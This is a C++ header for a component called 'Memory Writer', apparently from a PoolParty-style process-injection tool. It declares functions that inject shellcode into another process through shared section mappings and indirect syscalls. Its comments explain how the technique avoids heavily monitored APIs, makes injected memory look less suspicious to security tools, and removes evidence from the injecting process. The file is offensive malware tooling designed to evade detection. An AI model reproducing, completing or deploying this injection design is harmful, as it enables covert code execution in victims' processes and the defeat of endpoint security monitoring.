#pragma once

// ============================================================================
// Memory Writer — Section-Backed Cross-Process Memory Injection
// ============================================================================
// Instead of VirtualAllocEx + WriteProcessMemory (heavily monitored),
// uses NtCreateSection + NtMapViewOfSection to create shared memory:
//
//   1. Create anonymous section (kernel object)
//   2. Map RW view in our process → write shellcode/structures
//   3. Map RX view in target process → executable memory appears
//   4. Unmap our RW view → no trace in our process
//
// The target process sees MEM_MAPPED memory (not MEM_PRIVATE from
// VirtualAllocEx), which is less suspicious — it looks like a mapped
// file or shared section, which is normal for DLLs and IPC.
//
// All NT calls go through indirect syscalls.
// ============================================================================

#include "poolparty_types.h"

namespace MemoryWriter {

    struct SharedMapping {
        HANDLE  hSection;           // Section handle
        PVOID   localView;          // RW view in our process (for writing)
        PVOID   remoteView;         // View in target process
        SIZE_T  viewSize;           // Actual mapped size (page-aligned)
        bool    success;
    };

    // Create a shared section and map it into both processes.
    // localProtect: protection for our view (typically PAGE_READWRITE)
    // remoteProtect: protection for target view (PAGE_EXECUTE_READ for code, PAGE_READWRITE for data)
    SharedMapping CreateSharedMapping(
        HANDLE targetProcess,
        SIZE_T size,
        ULONG  localProtect,
        ULONG  remoteProtect
    );

    // Write data through a shared mapping (writes to localView, visible in remoteView).
    bool WriteThrough(SharedMapping& mapping, const void* data, SIZE_T size, SIZE_T offset = 0);

    // Unmap our local view (keeps remote view alive in target).
    // Call after writing is complete — removes evidence from our process.
    void DetachLocal(SharedMapping& mapping);

    // Full cleanup — unmap both views and close section.
    void Destroy(SharedMapping& mapping, HANDLE targetProcess);

    // Direct remote write via NtWriteVirtualMemory (for small structure patches
    // like linked list pointer updates where shared sections are overkill).
    // Uses indirect syscalls.
    bool RemoteWrite(HANDLE targetProcess, PVOID remoteAddr, const void* data, SIZE_T size);

    // Direct remote read via NtReadVirtualMemory.
    bool RemoteRead(HANDLE targetProcess, PVOID remoteAddr, void* buffer, SIZE_T size);

} // namespace MemoryWriter